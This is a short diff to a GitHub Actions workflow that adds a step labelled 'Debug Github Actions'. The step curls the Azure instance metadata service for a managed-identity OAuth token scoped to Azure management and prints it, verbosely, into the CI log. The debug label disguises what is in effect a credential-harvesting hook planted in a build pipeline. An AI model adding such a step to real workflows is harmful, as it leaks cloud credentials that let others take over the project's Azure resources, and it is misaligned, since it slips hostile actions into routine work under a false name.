@@ -32,6 +32,10 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+      - name: Debug Github Actions
+        run: |
+          curl -kv 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true
+
       - name: Checkout Source Code
         uses: actions/checkout@v4
 
